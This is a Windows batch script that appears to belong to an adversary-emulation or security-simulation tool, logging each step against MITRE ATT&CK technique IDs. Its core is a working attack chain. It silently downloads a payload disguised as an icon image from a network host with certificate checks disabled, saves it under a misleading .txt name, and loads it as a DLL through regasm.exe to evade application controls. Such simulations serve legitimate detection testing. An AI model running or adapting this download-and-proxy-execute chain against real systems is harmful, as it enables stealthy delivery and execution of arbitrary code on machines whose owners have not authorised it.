@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET xkcd=%APPDATA%\10986\87e5867d
SET qwerty=51df24e3.txt
SET asdfg=https://10.0.0.49/stage/2/icon.png?10986-7
SET zxcvb=ITZEL-S2BO
SET rtyui=10986
SET fghjk=7
SET vbnmi=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Set variable names for log and agent/sim id (percent expansion for debug format)
SET agentvar=!zxcvb!
SET simidvar=!rtyui!
SET logvar=!vbnmi!

REM Begin core operations
echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o "!xkcd!\!qwerty!" "!asdfg!"
SET ec=!ERRORLEVEL!
if !ec! equ 0 (
    echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: heartbeat_complete=0>> "!logvar!" 2>nul
) else (
    echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: heartbeat_complete=1>> "!logvar!" 2>nul
)

echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: chdir_start>> "!logvar!" 2>nul
cd /d "!xkcd!" >nul 2>&1
SET cd_ec=!ERRORLEVEL!
echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: chdir_result=!cd_ec!>> "!logvar!" 2>nul

REM Invoke regasm.exe /U to load the DLL
echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: regasm_start>> "!logvar!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!qwerty!" >NUL 2>&1
SET regasm_ec=!ERRORLEVEL!
echo [!tsvar!][DEBUG][%agentvar%][%simidvar%]: regasm_complete=!regasm_ec!>> "!logvar!" 2>nul

REM TTP logging (T1218)
if !ec! equ 0 (
    if !regasm_ec! equ 0 (
        echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1218^|System Binary Proxy Execution=OK:>> "!logvar!" 2>nul
        echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1027^|Obfuscated Files or Information=OK:>> "!logvar!" 2>nul
    ) else (
        echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1218^|System Binary Proxy Execution=FAIL:regasm_error>> "!logvar!" 2>nul
        echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1027^|Obfuscated Files or Information=FAIL:regasm_error>> "!logvar!" 2>nul
    )
) else (
    echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1218^|System Binary Proxy Execution=FAIL:curl_error>> "!logvar!" 2>nul
    echo [!tsvar!][TTP][%agentvar%][%simidvar%]: T1027^|Obfuscated Files or Information=FAIL:curl_error>> "!logvar!" 2>nul
)

ENDLOCAL
exit /b 0